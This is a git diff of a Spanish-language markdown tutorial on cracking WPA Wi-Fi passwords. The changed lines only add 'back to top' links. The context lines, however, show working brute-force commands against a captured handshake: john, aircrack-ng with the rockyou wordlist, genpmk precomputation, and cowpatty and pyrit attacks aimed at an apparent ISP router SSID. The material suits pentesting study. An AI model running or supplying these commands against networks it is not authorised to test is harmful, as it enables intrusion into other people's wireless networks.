@@ -274,6 +274,8 @@ SINOPSIS: YA vamos al turror, sacar el hash para posteriormente romperlo y sacar
     SINO
     $ john --show miHash --format=wpapsk-pmk
  ```
+ 
+[Subir](#top)
 
 <a name="item16"></a>
 ### FUERZA BRUTA CON AIRCRACK (La mas Recomendable)
@@ -281,6 +283,8 @@ SINOPSIS: YA vamos al turror, sacar el hash para posteriormente romperlo y sacar
 ---- NOS AHORARIAMOS VALIDANDO, TRATAMIENTO Y EXTRACCION DEL HASH---- 
   
 ``` $ aircrack-ng -w rockyou.txt Captura-01.cap ```
+
+[Subir](#top)
 
 <a name="item17"></a>
 ### FUERZA BRUTA CON GEMPMK
@@ -294,6 +298,8 @@ Cuando termino de realizar la precomputacion del .dic a .genpmk
 
 ``` $ cowpatty -d rockyou.genpmk -r Captura-01.cap -s MOVISTAR_3E5A ```
 
+[Subir](#top)
+
 <a name="item18"></a>
 ### FUERZA BRUTA CON PYRIT
 
@@ -303,7 +309,9 @@ Una forma de ir 450 veces mas rapido que con aircrack-ng es con gempmk pero tien
 ``` $ genpmk -f rockyou.txt -d rockyou.genpmk -s MOVISTAR_3E5A ```   (EN -s se pone el nombre del SSID )
  Cuando termino de realizar la precomputacion del .dic a .genpmk
 ``` $ pyrit -e   MOVISTAR_3E5A -i rockyou.genpmk -r Captura-01.cap attack_cowpatty ```
-    
+
+[Subir](#top)
+
 <a name="item19"></a>
 ### FUERZA BRUTA CON PYRIT Y PRECOMPUTACION ( La mas rapida)
 
